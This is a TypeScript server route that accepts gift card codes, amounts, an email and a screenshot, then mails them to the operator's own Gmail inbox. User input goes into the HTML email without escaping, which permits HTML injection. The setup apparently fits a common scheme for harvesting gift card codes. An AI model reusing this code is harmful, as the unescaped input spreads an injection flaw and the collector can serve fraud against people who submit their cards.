import { createServerFileRoute } from '@tanstack/start/server'
import nodemailer from 'nodemailer'

export const ServerRoute  = (createServerFileRoute as any)('/api/gift-card').methods({
  async POST({ request }: { request: Request }) {
    try {
      const formData = await request.formData()
      const cardType = formData.get('cardType')?.toString() ?? ''
      const amount = Number(formData.get('amount'))
      const cardCode = formData.get('cardCode')?.toString() ?? ''
      const email = formData.get('email')?.toString() ?? ''
      const file = formData.get('screenshot') as File | null

      if (!cardType || !cardCode || !email) throw new Error('Missing required fields')
      if (isNaN(amount) || amount <= 0) throw new Error('Invalid amount')

      let attachment: any = undefined
      if (file && 'arrayBuffer' in file) {
        attachment = [{
          filename: file.name || 'screenshot.jpg',
          content: Buffer.from(await file.arrayBuffer()),
          contentType: file.type,
        }]
      }

      const transporter = nodemailer.createTransport({
        service: 'gmail',
        auth: {
          user: process.env.MAIL_USER!,
          pass: process.env.MAIL_PASS!,
        },
      })

      await transporter.sendMail({
        from: `"Gift Card Service" <${process.env.MAIL_USER!}>`,
        to: process.env.MAIL_USER!,
        subject: `New Gift Card: ${cardType} ($${amount})`,
        text: `Card Details:\nType: ${cardType}\nAmount: $${amount}\nCode: ${cardCode}\nFrom: ${email}`,
        html: `
          <h2>New Gift Card Received</h2>
          <p><strong>Type:</strong> ${cardType}</p>
          <p><strong>Amount:</strong> $${amount}</p>
          <p><strong>Code:</strong> ${cardCode}</p>
          <p><strong>From:</strong> ${email}</p>
        `,
        attachments: attachment,
      })

      return new Response(
        JSON.stringify({ success: true, message: 'Gift card submitted successfully' }),
        { status: 200, headers: { 'Content-Type': 'application/json' } }
      )
    } catch (error) {
      return new Response(
        JSON.stringify({ 
          success: false, 
          message: error instanceof Error ? error.message : 'An error occurred' 
        }),
        { status: 400, headers: { 'Content-Type': 'application/json' } }
      )
    }
  }
})